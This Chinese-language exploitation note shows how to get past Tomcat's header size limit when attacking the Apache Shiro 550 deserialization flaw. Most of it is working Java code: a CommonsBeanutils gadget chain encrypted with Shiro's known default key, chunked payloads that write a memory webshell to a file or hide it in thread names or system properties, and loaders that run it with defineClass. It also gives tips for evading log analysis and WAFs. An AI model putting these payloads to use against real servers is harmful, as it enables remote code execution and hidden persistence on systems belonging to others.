%%  %%# **shiro550突破Tomcat Header长度限制**

4tacker师傅写到的：[浅谈Shiro550受Tomcat Header长度限制影响突破](https://y4tacker.github.io/2022/04/14/year/2022/4/浅谈Shiro550受Tomcat-Header长度限制影响突破/#浅谈Shiro550受Tomcat-Header长度限制影响突破)

Bmth师傅的:[Shiro绕过Header长度限制进阶利用](http://www.bmth666.cn/2024/11/03/Shiro%E7%BB%95%E8%BF%87Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/index.html)

pen4uin师傅的文章：[记一次 Shiro 的实战利用](https://mp.weixin.qq.com/s/w9sMhMrCy1pofOV-h94qbQ)
[记一次 Shiro 的实战利用(摘抄)](记一次%20Shiro%20的实战利用(摘抄).md)：上面的师傅文章中也有，主要是里面通过延时的手段验证环境和一些条件
[终极Java反序列化Payload缩小技术(摘抄)](终极Java反序列化Payload缩小技术(摘抄).md)

## 文件落地+追加

pen4uin师傅的文章：[记一次 Shiro 的实战利用](https://mp.weixin.qq.com/s/w9sMhMrCy1pofOV-h94qbQ)

利用到的是文件落地+追加的方式，也是最基础的一种

简单演示一遍
首先使用JMG生成Tomcat内存马，输出格式为BASE64
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/e54d240ab0064f51ae449df52e6e4f00.png)
将结果放入`[payload]`中，限制每组长度为1000

```java
import javassist.ClassPool;
import javassist.CtClass;

public class WriteFile {
    public static void main(String[] args) throws Exception{
        String base64 = [payload];
        int groupSize = 1000;
        int length = base64.length();
        int startIndex = 0;
        int endIndex = Math.min(length, groupSize);
        int a = 1;
        while (startIndex < length) {
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            ClassPool classPool=ClassPool.getDefault();
            classPool.appendClassPath(AbstractTranslet);
            CtClass payload=classPool.makeClass(String.valueOf(a));
            payload.setSuperclass(classPool.get(AbstractTranslet));
            String group = base64.substring(startIndex, endIndex);
            startIndex = endIndex;
            endIndex = Math.min(startIndex + groupSize, length);
            String cmd = "{String[] strs = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", \"echo "+group+"> 1.txt\"} : new String[]{\"/bin/sh\", \"-c\", \"echo "+group+"> 1.txt\"};\n"+"java.lang.Runtime.getRuntime().exec(strs);}";
            if(a>=2){
                cmd = "{String[] strs = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", \"echo "+group+">> 1.txt\"} : new String[]{\"/bin/sh\", \"-c\", \"echo "+group+">> 1.txt\"};\n"+"java.lang.Runtime.getRuntime().exec(strs);}";
            }
//            System.out.println(cmd);
            payload.makeClassInitializer().setBody(cmd);
            byte[] bytes=payload.toBytecode();
            System.out.println(new CommonsBeanutilsString().getPayload(bytes));
            a++;
        }
    }
}
```

这里需要找一个可写的路径，linux可以为`/tmp`目录下

CB的代码如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutilsString {
    public String getPayload(byte[] bytes) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();

        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(baos.toByteArray(), key);
        return ciphertext.toString();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

得到的payload长度仅仅为3000+，可以说是非常短了，如果需要更短的话将groupSize调小即可

依次执行，验证一下生成的文件
![6e33d61de1764a2a8892d90377c5c6b8.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/6e33d61de1764a2a8892d90377c5c6b8.png)

没有问题，最后defineClass加载内存马

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ClassLoaderFromFile extends AbstractTranslet {
    static {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            byte[] fileBytes = Files.readAllBytes(Paths.get("./1.txt"));
            String fileContent = new String(fileBytes, StandardCharsets.UTF_8);
            String base64Str = fileContent.replace("\r","").replace("\n","");
            byte[] clazzByte = org.apache.shiro.codec.Base64.decode(base64Str);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            clazz.newInstance();
        } catch (Exception e){}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

但是，这种方法有一个很明显的弊端，就是存在文件落地，有没有更好的办法呢？

## 使用线程对象的名字存储

y4tacker师傅写到的：[浅谈Shiro550受Tomcat Header长度限制影响突破](https://y4tacker.github.io/2022/04/14/year/2022/4/浅谈Shiro550受Tomcat-Header长度限制影响突破/#浅谈Shiro550受Tomcat-Header长度限制影响突破)

###  思路一：修改maxHeaderSize

首先是在网上参考学习到了Litch1写的文章 [基于全局储存的新思路 | Tomcat的一种通用回显方法研究](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44)

里面提到了去修改org.apache.coyote.http11.AbstractHttp11Protocol中的maxHeaderSize的值，里面通过多个线程发送payload来确保request的inputbuffer会复用，个人觉得不太稳定，另一方面就算构造出来了其实也很长了。

### 思路二：分离payload+动态类加载

1. 这个思路主要来源于读到开源工具 [ShiroAttack2](https://github.com/SummerSec/ShiroAttack2) 里面提到的将payload分离为两个部分(一部分是去触发反序列化Gadget，另一部分是)，我的环境是tomcat8(因此需要遍历线程对象获取request/response便于回显)
![1-1734423175950-15.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/1-1734423175950-15.png)

这里一个比较骚的点是通过Class自带的方法equals去传递request与response，当然也可以用其他的，这样比较方便
![2.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/2.png)

这样我们就成功实现了将payload缩短能获得回显的目的了

### 浅谈新思路

但是呢，个人并不满足仅仅只是成功，如果某一天在某些框架下让header更短怎么办？这里我主要解决不落地的思路

能不能再将上面的思路二再分离开来来简单实现**缩短payload+分散发包**

要解决这个那么一定要解决在全局能够持久存储我们的payload的地方，这里我想到了去修改当前线程对象的名字(Thread.*currentThread*().setName())，测试了下Thread的name能够有足够储存我们长度的能力
![4-1734423347705-24.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/4-1734423347705-24.png)

经过简单测试发现每次刷新网页这个线程都会改变，但总量就那么几个，那么我们肯定需要通过遍历来筛选
![5.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/5.png)

当然为了方便，我先将其中一个设置成我的id:Thread.currentThread().setName(“y4tacker”);

```java
try {
  ThreadGroup a = Thread.currentThread().getThreadGroup();
  java.lang.reflect.Field v2 = a.getClass().getDeclaredField("threads");
  v2.setAccessible(true);
  Thread[] o = (Thread[]) v2.get(a);
  for(int i = 0; i < o.length; ++i) {Thread z = o[i];if (z.getName().contains("y4tacker")){z.setName(z.getName()+"我是注入的payload");
                                                                                          }}}catch (Exception e){}


```

通过一些其他手段缩减payload至最小差不多2400

这样我们只需要将注入的payload分成多段慢慢加入，通过下面的代码来最终触发我们设置向线程的paylaod执行任意代码

```java
try {
ThreadGroup a = Thread.currentThread().getThreadGroup();java.lang.reflect.Field v2 = a.getClass().getDeclaredField("threads");v2.setAccessible(true);Thread[] o = (Thread[]) v2.get(a);for(int i = 0; i < o.length; ++i) {Thread z = o[i];if (z.getName().contains("y4")){
 byte[] x = org.apache.shiro.codec.Base64.decode(z.getName().replaceAll("y4tacker", ""));
 java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
 defineClassMethod.setAccessible(true);
 ((Class)defineClassMethod.invoke(a.class.getClassLoader(), x, 0, x.length)).newInstance();
}}}catch (Exception e){}


```

	这样还给我们一个好处就是，在每次发包的时候切换代理变更ip，maybe可以导致后台分析日志的时候会更难(毕竟每次发包之间总有其他用户的正常操作XD)，简单测试一下能不能弹个计算器嘞，答案永远是Yes

**搞完了记得把线程名改回去**

payload:

```java
import javassist.ClassPool;
import javassist.CtClass;

public class WriteThread {
    public static void main(String[] args) throws Exception{
        String base64 = [payload];
        int groupSize = 1000;
        int length = base64.length();
        int startIndex = 0;
        int endIndex = Math.min(length, groupSize);
        int a = 1;
        String cmd = "Thread.currentThread().setName(\"Test\");";
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("SetName");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody(cmd);
        byte[] bytes=payload.toBytecode();
        String poc = new CommonsBeanutilsString().getPayload(bytes);
        System.out.println(poc);

        while (startIndex < length) {
            payload=classPool.makeClass(String.valueOf(a));
            payload.setSuperclass(classPool.get(AbstractTranslet));
            String group = base64.substring(startIndex, endIndex);
            startIndex = endIndex;
            endIndex = Math.min(startIndex + groupSize, length);
            cmd = "{try {\n" +
                    "    ThreadGroup a = Thread.currentThread().getThreadGroup();\n" +
                    "    java.lang.reflect.Field v2 = a.getClass().getDeclaredField(\"threads\");\n" +
                    "    v2.setAccessible(true);\n" +
                    "    Thread[] o = (Thread[]) v2.get(a);\n" +
                    "    for(int i = 0; i < o.length; ++i) {\n" +
                    "        Thread z = o[i];if (z.getName().contains(\"Test\")){\n" +
                    "            z.setName(z.getName()+\""+group+"\");\n" +
                    "        }\n" +
                    "    }\n" +
                    "}catch (Exception e){}}";
//            System.out.println(cmd);
            payload.makeClassInitializer().setBody(cmd);
            bytes=payload.toBytecode();
            poc = new CommonsBeanutilsString().getPayload(bytes);
            System.out.println(poc);
            a++;
        }
    }
}
```

加载：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ClassLoaderFromThreadName extends AbstractTranslet {
    static {
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        try {
            Field threadsField = threadGroup.getClass().getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[]) threadsField.get(threadGroup);
            for (Thread thread : threads) {
                if (thread.getName().contains("Test")) {
                    String payload = thread.getName().replaceAll("Test", "");
                    byte[] clazzByte = org.apache.shiro.codec.Base64.decode(payload);
                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClassMethod.setAccessible(true);
                    ((Class)defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length)).newInstance();
                    break;
                }
            }
        } catch (Exception e) {}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

## 使用系统变量存储

虽然通过线程名的方式已经解决了不出网+无落地，但是总归不够优雅

在Firebasky师傅的知识星球中（已经过期了qwq），有位师傅给出了更通俗易懂的方案，应该也是其中最短的吧，非常巧妙

通过`System.setProperty`设置系统属性的方式将payload存储在系统属性中

```java
System.setProperty("a","__PAYLOAD__");
```

分块去设置Property，然后通过读取我们设置的内容实现加载

最终给出poc：

```java
import javassist.ClassPool;
import javassist.CtClass;

public class WriteProperty {
    public static void main(String[] args) throws Exception{
        String base64 = [payload];
        int groupSize = 1000;
        int length = base64.length();
        int startIndex = 0;
        int endIndex = Math.min(length, groupSize);
        int a = 1;
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);

        System.out.println("设置系统属性：");
        while (startIndex < length) {
            CtClass payload=classPool.makeClass(String.valueOf(a));
            payload.setSuperclass(classPool.get(AbstractTranslet));
            String group = base64.substring(startIndex, endIndex);
            startIndex = endIndex;
            endIndex = Math.min(startIndex + groupSize, length);
            String cmd = "System.setProperty(\""+a+"\",\""+group+"\");";
//            System.out.println(cmd);
            payload.makeClassInitializer().setBody(cmd);
            byte[] bytes=payload.toBytecode();
            String poc = new CommonsBeanutilsString().getPayload(bytes);
            System.out.println(poc);
            a++;
        }
        String bytestr ="";
        for(int i=1;i<=a-1;i++){
            if(i<a-1){
                bytestr = bytestr + "System.getProperty(\""+i+"\")+";
            }else {
                bytestr = bytestr + "System.getProperty(\""+i+"\");";
            }
        }
        String cmd = "{try {\n" +
                "ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "String base64Str = "+bytestr+"\n" +
                "byte[] clazzByte = org.apache.shiro.codec.Base64.decode(base64Str);\n" +
                "java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class,int.class});\n" +
                "defineClass.setAccessible(true);\n" +
                "Class clazz = (Class)defineClass.invoke(classLoader,new Object[]{clazzByte, new Integer(0), new Integer(clazzByte.length)});\n" +
                "clazz.newInstance();\n" +
                "}catch (Exception e){}}";
//        System.out.println(cmd);
        CtClass payload=classPool.makeClass("ld");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody(cmd);
        byte[] bytes=payload.toBytecode();
        String poc = new CommonsBeanutilsString().getPayload(bytes);
        System.out.println("加载字节码：\n"+poc);
    }
}
```

为了不影响系统，加载成功之后可以将值改为null

注意：bp发包的时候取消勾选URL编码，并且设置线程为1

![a0d01479621b419193f7db89982c2e42.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/a0d01479621b419193f7db89982c2e42.png)


![b1d2c1845fda48d8a907f468ddbdb7be.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/b1d2c1845fda48d8a907f468ddbdb7be.png)

![3.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/3.png)

第一种方式是将内存马存储在文件当中，而后续两种则是存储在内存当中，更加隐蔽，动静更小。Tomcat默认的header最大长度为8192，正常来说是不需要这么复杂的方案的，仅仅是作为一个思维的扩展，其中还可以对其中的代码长度进一步进行缩小：[终极Java反序列化Payload缩小技术](https://mp.weixin.qq.com/s/cQCYhBkR95vIVBicA9RR6g)
## 后记

网上看博客的时候看到一篇觉得也挺有意思：
https://blog.csdn.net/xd_2021/article/details/123720314
使用未知http请求方法让waf解析。
debug分析后发现，当未知http请求时，shiro是先处理cookie后再到servlet，所以rememberMe值是会处理的。

